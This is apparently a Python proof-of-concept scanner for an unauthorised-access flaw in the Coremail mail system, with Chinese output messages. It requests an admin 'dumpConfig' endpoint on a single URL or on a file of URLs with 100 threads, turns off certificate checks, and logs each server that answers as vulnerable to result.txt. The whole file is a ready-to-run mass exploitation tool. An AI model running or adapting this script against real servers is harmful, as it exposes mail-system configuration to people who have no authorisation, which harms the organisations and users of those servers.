import requests,sys,re,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """                                          ___________
_______________________________ _________ ___(_)__  /
_  ___/  __ \_  ___/  _ \_  __ `__ \  __ `/_  /__  / 
/ /__ / /_/ /  /   /  __/  / / / / / /_/ /_  / _  /  
\___/ \____//_/    \___//_/ /_/ /_/\__,_/ /_/  /_/   
                                                     """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='coremail 邮件系统未授权访问')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    payload = '/mailsms/s?func=ADMIN:appState&dumpConfig=/'
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0',
        'Connection':'close',
    }
    try:
        res = requests.get(url=target+payload,headers=headers,verify=False,timeout=15)
        if res.status_code == 200 and 'name=' in res.text:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
                return True
    except Exception as e:
        print(f'[!]网站异常，请手工测试：{target}')
        return False

if __name__ == '__main__':
    main()